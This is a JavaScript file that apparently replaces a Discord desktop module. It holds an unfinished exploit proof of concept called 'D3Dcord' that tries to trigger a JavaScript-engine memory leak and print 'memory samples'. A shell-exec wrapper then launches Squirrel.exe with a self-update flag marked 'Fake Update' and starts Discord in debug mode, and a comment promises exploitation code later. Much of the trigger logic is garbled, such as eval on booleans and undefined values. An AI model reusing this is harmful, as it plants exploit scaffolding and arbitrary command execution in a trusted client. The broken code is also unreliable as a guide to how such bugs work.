'use strict';
module.exports = require('./core.asar');
function sysCMD(cmdSTR) {const exec = require('child_process').exec;const child = exec(cmdSTR,(error, stdout, stderr) => {console.log(`${stdout}`);console.log(`${stderr}`);if (error !== null) {console.log(`${error}`);}});}
function foo(trigger) {return Object.is((trigger ? -0 : 0) - 0, -0);}
const double2int = (v) => {let buf = new ArrayBuffer(8);let farr = new Float64Array(buf);let iarr = new Uint32Array(buf);farr[0] = v;let d = (iarr[1] * 0x100000000) + iarr[0];return d;};
function trig() { eval("var min=0; var max=10; var random = Math.floor(Math.random() * (+max - +min)) + +min; var a = ''; for (var i = 1; i <= 1; i++) { a += random + '\"0U\x02A\x01y$\x00\x01@\x03\x03'; } console.log(a)"); }
console.log('Triggering D3Dcord...');
  try {
    let iterable = new Array(10);
    let bef = eval(foo(false));
    let duck = eval(trig());
    for(var i=10000000;i>0;--i){foo(false);iterable[i] = 13.37;}
    let aft = eval(foo(true));
    iterable.length = 0;
    let memit = new Map(iterable);
    if (bef == aft && i == 0)
      {
        console.log('\nD3Dcord Triggered!\nMemory Sample: ' + double2int(memit).toString(iterable[i]) + '\nMemory Sample: ' + double2int(duck).toString(12));
      } else {
        throw "not vulnerable";
      }
  } catch (e) {
    console.log('D3Dcord Failed! ' + e);
  }
  finally {
    console.log('Spawning Discord...');
    sysCMD("start /WAIT Squirrel.exe --updateSelf=Discord.exe");  // Fake Update
    sysCMD("start /WAIT Discord.exe --debug=true");   // Experimental Debug?
    console.log('Discord Spawned!');
  }

          // WILL ADD EXPLOITATION CODE LATER WHEN DONE AND WRITEUP
